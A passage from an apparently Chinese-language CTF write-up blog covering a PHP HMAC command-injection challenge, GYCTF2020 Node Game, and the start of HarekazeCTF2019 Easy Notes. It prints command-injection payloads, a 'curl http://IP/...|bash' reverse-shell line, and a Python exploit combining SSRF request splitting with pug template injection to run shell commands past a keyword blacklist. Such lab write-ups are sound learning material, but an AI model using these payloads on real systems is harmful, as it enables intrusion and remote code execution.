class="hljs-variable">$key</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-variable">$data2</span> = <span class="hljs-string">&#x27;;cat flag.php&#x27;</span>;<br><span class="hljs-variable">$hmac2</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$data2</span>, <span class="hljs-variable">$key</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$hmac2</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$one</span><span class="hljs-attribute">-ear</span>=;cat flag.php<br>这时加密密钥变成了<span class="hljs-literal">NULL</span><br>payload:<br>White-cat-monitor[]=0&amp;<span class="hljs-attribute">One-ear</span>=;cat flag.php&amp;<span class="hljs-attribute">Black-Cat-Sheriff</span>=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6<br></code></pre></td></tr></table></figure><p>这里其实不知道为啥直接<code>cat flag.php</code>了，感觉<code>ls</code>没太大作用。<code>buu</code>的话<code>flag</code>在环境变量里，payload换成<code>;env</code>就行，或者反弹shell:<code>curl http://IP/1.txt|bash</code></p><h4 id="思路总结：-5"><a href="#思路总结：-5" class="headerlink" title="思路总结："></a>思路总结：</h4><p>hash加密，exec命令执行。</p><h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p><code>js</code>的题？顺便查了下<code>pug</code>，一个模板引擎。</p><p>![1GYCTF2020Node Game](img&#x2F;1GYCTF2020Node Game.png)</p><p>上面的链接直接给了源码，注意这个<code>URL</code>：<code>core?q=source</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 引入所需的模块</span><br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> pug = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;pug&#x27;</span>);<br><span class="hljs-keyword">var</span> morgan = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan&#x27;</span>);<br><span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;multer&#x27;</span>);<br><br><span class="hljs-comment">// 设置中间件</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">multer</span>(&#123; <span class="hljs-attr">dest</span>: <span class="hljs-string">&#x27;./dist&#x27;</span> &#125;).<span class="hljs-title function_">array</span>(<span class="hljs-string">&#x27;file&#x27;</span>));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">morgan</span>(<span class="hljs-string">&#x27;short&#x27;</span>));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/uploads&quot;</span>, express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;/uploads&#x27;</span>)));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/template&quot;</span>, express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;/template&#x27;</span>)));<br><br><span class="hljs-comment">// 处理根路径的GET请求</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">var</span> action = req.<span class="hljs-property">query</span>.<span class="hljs-property">action</span> ? req.<span class="hljs-property">query</span>.<span class="hljs-property">action</span> : <span class="hljs-string">&quot;index&quot;</span>;<br><br>    <span class="hljs-comment">// 阻止包含斜杠的请求</span><br>    <span class="hljs-keyword">if</span> (action.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;/&quot;</span>) || action.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;\\&quot;</span>)) &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Errrrr, You have been Blocked&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">var</span> file = path.<span class="hljs-title function_">join</span>(__dirname + <span class="hljs-string">&#x27;/template/&#x27;</span> + action + <span class="hljs-string">&#x27;.pug&#x27;</span>);<br>    <span class="hljs-keyword">var</span> html = pug.<span class="hljs-title function_">renderFile</span>(file);<br>    res.<span class="hljs-title function_">send</span>(html);<br>&#125;);<br><br><span class="hljs-comment">// 处理文件上传的POST请求</span><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/file_upload&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">var</span> ip = req.<span class="hljs-property">connection</span>.<span class="hljs-property">remoteAddress</span>;<br>    <span class="hljs-keyword">var</span> obj = &#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;&#x27;</span> &#125;;<br><br>    <span class="hljs-comment">// 只允许特定IP进行文件上传</span><br>    <span class="hljs-keyword">if</span> (!ip.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)) &#123;<br>        obj.<span class="hljs-property">msg</span> = <span class="hljs-string">&quot;only admin&#x27;s ip can use it&quot;</span>;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    fs.<span class="hljs-title function_">readFile</span>(req.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>].<span class="hljs-property">path</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">err, data</span>) &#123;<br>        <span class="hljs-keyword">if</span> (err) &#123;<br>            obj.<span class="hljs-property">msg</span> = <span class="hljs-string">&#x27;upload failed&#x27;</span>;<br>            res.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">var</span> file_path = <span class="hljs-string">&#x27;/uploads/&#x27;</span> + req.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>].<span class="hljs-property">mimetype</span> + <span class="hljs-string">&quot;/&quot;</span>;<br>            <span class="hljs-keyword">var</span> file_name = req.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>].<span class="hljs-property">originalname</span>;<br>            <span class="hljs-keyword">var</span> dir_file = __dirname + file_path + file_name;<br><br>            <span class="hljs-comment">// 如果目录不存在，则创建目录</span><br>            <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(__dirname + file_path)) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    fs.<span class="hljs-title function_">mkdirSync</span>(__dirname + file_path);<br>                &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                    obj.<span class="hljs-property">msg</span> = <span class="hljs-string">&quot;file type error&quot;</span>;<br>                    res.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                fs.<span class="hljs-title function_">writeFileSync</span>(dir_file, data);<br>                obj = &#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;upload success&#x27;</span>, <span class="hljs-attr">filename</span>: file_path + file_name &#125;;<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                obj.<span class="hljs-property">msg</span> = <span class="hljs-string">&#x27;upload failed&#x27;</span>;<br>            &#125;<br>            res.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));<br>        &#125;<br>    &#125;);<br>&#125;);<br><br><span class="hljs-comment">// 处理&#x27;/source&#x27;路径的GET请求</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/source&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname + <span class="hljs-string">&#x27;/template/source.txt&#x27;</span>));<br>&#125;);<br><br><span class="hljs-comment">// 处理&#x27;/core&#x27;路径的GET请求</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/core&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">var</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>;<br>    <span class="hljs-keyword">var</span> resp = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (q) &#123;<br>        <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;http://localhost:8081/source?&#x27;</span> + q;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(url);<br><br>        <span class="hljs-comment">// 检查URL是否包含黑名单关键词</span><br>        <span class="hljs-keyword">var</span> trigger = <span class="hljs-title function_">blacklist</span>(url);<br>        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) &#123;<br>            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;error occurs!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 发送HTTP请求获取数据并转发给客户端</span><br>                http.<span class="hljs-title function_">get</span>(url, <span class="hljs-keyword">function</span>(<span class="hljs-params">resp</span>) &#123;<br>                    resp.<span class="hljs-title function_">setEncoding</span>(<span class="hljs-string">&#x27;utf8&#x27;</span>);<br>                    resp.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (err.<span class="hljs-property">code</span> === <span class="hljs-string">&quot;ECONNRESET&quot;</span>) &#123;<br>                            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Timeout occurs&quot;</span>);<br>                            <span class="hljs-keyword">return</span>;<br>                        &#125;<br>                    &#125;);<br>                    resp.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>) &#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                            resps = chunk.<span class="hljs-title function_">toString</span>();<br>                            res.<span class="hljs-title function_">send</span>(resps);<br>                        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                            res.<span class="hljs-title function_">send</span>(e.<span class="hljs-property">message</span>);<br>                        &#125;<br>                    &#125;).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>                        res.<span class="hljs-title function_">send</span>(e.<span class="hljs-property">message</span>);<br>                    &#125;);<br>                &#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error);<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);<br>    &#125;<br>&#125;);<br><br><span class="hljs-comment">// 检查URL是否包含黑名单关键词的函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">blacklist</span>(<span class="hljs-params">url</span>) &#123;<br>    <span class="hljs-keyword">var</span> evilwords = [<span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>, <span class="hljs-string">&quot;mainModule&quot;</span>, <span class="hljs-string">&quot;require&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;child_process&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>];<br>    <span class="hljs-keyword">var</span> arrayLen = evilwords.<span class="hljs-property">length</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; arrayLen; i++) &#123;<br>        <span class="hljs-keyword">const</span> trigger = url.<span class="hljs-title function_">includes</span>(evilwords[i]);<br>        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 启动服务器监听端口8081</span><br><span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8081</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> host = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">address</span>;<br>    <span class="hljs-keyword">var</span> port = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port);<br>&#125;);<br></code></pre></td></tr></table></figure><p>下面的链接是文件上传，不过提示只有<code>admin</code>的<code>ip</code>才可以使用：<code>?action=upload</code></p><p>不过前面的代码已经解释了，只要<code>127.0.0.1</code>才行，注意这东西没法伪造。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;msg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;only admin&#x27;s ip can use it&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><code>blacklist</code>函数过滤了一系列关键字：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">blacklist</span>(<span class="hljs-params">url</span>) &#123;<br>    <span class="hljs-keyword">var</span> evilwords = [<span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>, <span class="hljs-string">&quot;mainModule&quot;</span>, <span class="hljs-string">&quot;require&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;child_process&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>];<br></code></pre></td></tr></table></figure><p>不过<code>js</code>本身就是一种非常灵活的语言，所以他这么过滤基本没啥用。</p><p>搜了下<code>pug</code>模板注入，也参考了几位师傅的文章：</p><p><a href="https://chenlvtang.top/2021/03/08/%E9%80%9A%E8%BF%87HTTP%E8%AF%B7%E6%B1%82%E6%8B%86%E5%88%86%E8%BF%9B%E8%A1%8CSSRF/">参考文章</a></p><p><a href="https://guokeya.github.io/post/hz6_KR03h/">参考wenzhang</a></p><p>思路就是通过<code>core</code>路由提供的内网<code>URL</code>请求进行<code>SSRF</code>实现<code>file_upload</code>路由中文件上传的功能。然后配合<code>pug模板</code>渲染进行命令执行。</p><p>参考文章里的脚本(我自己写不出来)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">&#x27;&#x27;&#x27; HTTP/1.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">POST /file_upload HTTP/1.1</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=---------------------------41671423531508392532090664957</span><br><span class="hljs-string">Content-Length: 350</span><br><span class="hljs-string"></span><br><span class="hljs-string">-----------------------------41671423531508392532090664957</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;</span><br><span class="hljs-string">Content-Type: ../template</span><br><span class="hljs-string"></span><br><span class="hljs-string">-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;)</span><br><span class="hljs-string">-return x</span><br><span class="hljs-string">-----------------------------41671423531508392532090664957--</span><br><span class="hljs-string"></span><br><span class="hljs-string">GET /flag HTTP/1.1</span><br><span class="hljs-string">x:&#x27;&#x27;&#x27;</span><br>payload = payload.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;\r\n&quot;</span>)<br>payload = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0xff&#x27;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> payload) <br><span class="hljs-built_in">print</span>(payload)<br>r = requests.get(<span class="hljs-string">&#x27;http://5e5020f0-cba3-4d9e-98ff-81274c42ce13.node3.buuoj.cn/core?q=&#x27;</span> + urllib.parse.quote(payload))<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>GET &#x2F;flag只是为了闭合HTTP请求：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk">原始请求数据如下：<br>GET <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span><br>Host: xxx.xxx.xxx<br><br>当我们插入数据后:<br>GET <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span><br><br>GET <span class="hljs-regexp">/upload_file HTTP/</span><span class="hljs-number">1.1</span><br>xxxxxx文件上传<br>xxxxxx文件上传<br><br>Host:xxxxxxxxxx<br><br>上次请求包的Host参数就单独出来了。会报错。所以我们再构造一个请求把他闭合<br><br>GET <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span><br><br>GET <span class="hljs-regexp">/upload_file HTTP/</span><span class="hljs-number">1.1</span><br>xxxxxx文件上传<br>xxxxxx文件上传<br><br>GET <span class="hljs-regexp">/flag HTTP/</span><span class="hljs-number">1.1</span><br>x:Host:xxxxxxxxxx<br>为啥要加这个x:我也不是很清楚。因为如果不加直接就以Host:xxxx闭合了，但不加这东西还执行不了命令。。。<br></code></pre></td></tr></table></figure><p>然后就是怎么执行命令(pug模板规则，感觉这东西有一点点像yaml?)：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">- <span class="hljs-keyword">var</span> x =<span class="hljs-number">1</span><br>- <span class="hljs-keyword">return</span> x<br><span class="hljs-comment">//访问页面会看到1</span><br></code></pre></td></tr></table></figure><p>所以可以通过：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">-<span class="hljs-keyword">var</span> x = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;glob&quot;</span>+<span class="hljs-string">&quot;al.proce&quot;</span>+<span class="hljs-string">&quot;ss.mainMo&quot;</span>+<span class="hljs-string">&quot;dule.re&quot;</span>+<span class="hljs-string">&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;</span>)<br>-<span class="hljs-keyword">return</span> x<br></code></pre></td></tr></table></figure><p>这种拼接来绕过黑名单从而执行命令</p><p>然后是<code>payload</code>的转换，首先黑名单里出了关键字还过滤了单双引号，需要编码绕过:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">blacklist</span>(<span class="hljs-params">url</span>) &#123;<br>    <span class="hljs-keyword">var</span> evilwords = [<span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>, <span class="hljs-string">&quot;mainModule&quot;</span>, <span class="hljs-string">&quot;require&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;child_process&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>];<br></code></pre></td></tr></table></figure><p>脚本里用的这种编码绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0xff&#x27;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> payload)<br></code></pre></td></tr></table></figure><p>这个编码方式没搞懂。。</p><h2 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h2><p>提示<code>admin</code>用户才能<code>GetFlag</code>，然后存在下载我们上传的<code>Notes</code>功能：</p><p>一开始以为这里存在任意文件下载，但并没有</p><p>源码 ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span 